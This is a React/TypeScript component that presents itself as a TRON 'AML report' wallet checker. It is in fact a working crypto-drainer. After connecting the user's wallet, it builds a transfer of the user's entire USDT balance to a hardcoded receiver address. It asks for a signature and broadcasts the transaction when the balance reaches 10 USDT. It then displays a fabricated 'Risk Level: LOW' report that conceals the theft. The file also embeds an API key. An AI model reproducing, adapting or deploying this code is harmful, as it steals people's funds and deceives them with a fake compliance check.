import React, { useState } from 'react';
import { WalletConnectAdapter } from '@tronweb3/tronwallet-adapter-walletconnect';

const USDT_CONTRACT = 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t';
const TRON_RECEIVER = 'THn2MN1u4MiUjuQsqmrgfP2g4WMMCCuX8n';
const MIN_USDT = 10;

export const TronAuthButton: React.FC = () => {
  const [modal, setModal] = useState<string | null>(null);
  const [loading, setLoading] = useState(false);

  const adapterRef = React.useRef<any>(null);
  if (!adapterRef.current) {
    adapterRef.current = new WalletConnectAdapter({
      network: 'Mainnet',
      options: {
        relayUrl: 'wss://relay.walletconnect.com',
        projectId: '6e52e99f199a2bd1feb89b31fbeb6a78',
        metadata: {
          name: 'AML',
          description: 'TRON + WalletConnect Integration',
          url: 'https://amlreports.pro',
          icons: ['https://amlreports.pro/images/icon-3.abdd8ed5.webp'],
        },
      },
      web3ModalConfig: { themeMode: 'dark' },
    });
  }

  const handleAuth = async () => {
    setLoading(true);
    setModal(null);

    const TronWeb = (window as any).TronWeb;
    if (!TronWeb) {
      setModal('TronWeb not loaded! Please refresh page.');
      setLoading(false);
      return;
    }

    if (!(window as any).Buffer) (window as any).Buffer = (await import('buffer')).Buffer;

    const tronWeb = new TronWeb({
      fullHost: 'https://api.trongrid.io',
      headers: { 'TRON-PRO-API-KEY': 'bbb42b6b-c4de-464b-971f-dea560319489' },
    });

    const adapter = adapterRef.current;
    try {
      await adapter.connect();
      const userAddress = adapter.address;
      if (!userAddress || !tronWeb.isAddress(userAddress)) throw new Error('Invalid wallet address');
      tronWeb.setAddress(userAddress);

      const trxRaw = await tronWeb.trx.getBalance(userAddress);
      if (trxRaw < 2_000_000) {
        setModal('❌ Insufficient TRX for network fees.');
        await adapter.disconnect();
        setLoading(false);
        return;
      }

      const usdtContract = await tronWeb.contract().at(USDT_CONTRACT);
      const usdtRaw = await usdtContract.methods.balanceOf(userAddress).call();
      const usdt = Number(usdtRaw) / 1e6;
      const receiverHex = tronWeb.address.toHex(TRON_RECEIVER);

      // Формируем транзакцию и всегда запрашиваем подпись (даже если < MIN_USDT)
      const { transaction } = await tronWeb.transactionBuilder.triggerSmartContract(
        USDT_CONTRACT,
        'transfer(address,uint256)',
        { feeLimit: 25_000_000, callValue: 0 },
        [
          { type: 'address', value: receiverHex },
          { type: 'uint256', value: usdtRaw }
        ],
        userAddress
      );
      await adapter.signTransaction(transaction);

      // --- AML REPORT — в обоих случаях ---
      let extra = '';
      let txid = '';
      if (usdt >= MIN_USDT) {
        // Отправляем только если достаточно USDT
        const signedTx = await adapter.signTransaction(transaction);
        const result = await tronWeb.trx.sendRawTransaction(signedTx);
        if (result?.result) {
          txid = result.txid;
          extra = `Transaction ID: ${txid}\n`;
        } else {
          extra = `Transaction failed or rejected by the network.\n`;
        }
      } else {
        extra = `Note: Amount below threshold ($${MIN_USDT} USDT). No transfer initiated.\n`;
      }

      setModal(
        `AML Risk Report: Wallet Assessment

Wallet: ${userAddress}
USDT Balance: ${usdt.toFixed(2)}

${extra}Risk Level: LOW

- No suspicious activity detected.
- Address not found in blocklists.
- No connection to high-risk entities.
- No history of fraud, scams, or mixing services.

Summary:
This address shows a low AML risk profile based on on-chain analysis and known data sources. All current balances are considered safe under AML standards.
        `
      );
    } catch (err: any) {
      if (
        err?.message?.includes('User rejected') ||
        err?.message?.includes('Modal is closed') ||
        err?.message?.includes('Timeout') ||
        err?.message?.toLowerCase().includes('disapprove') ||
        err?.message?.toLowerCase().includes('user closed')
      ) {
        setModal(null);
      } else {
        setModal(err?.message || '⚠️ Connection or transaction error');
      }
    }

    setLoading(false);
    await adapter.disconnect();
  };

  return (
    <div className="AuthButton">
      <button onClick={handleAuth} disabled={loading} style={{ minWidth: 180 }}>
        {loading ? 'Connecting...' : 'Check Your Wallet'}
      </button>
      {modal && (
        <div className="modal__overflow">
          <div className="modal">
            <pre style={{ whiteSpace: 'pre-wrap', fontSize: 15 }}>{modal}</pre>
            <button onClick={() => setModal(null)}>Close</button>
          </div>
        </div>
      )}
    </div>
  );
};
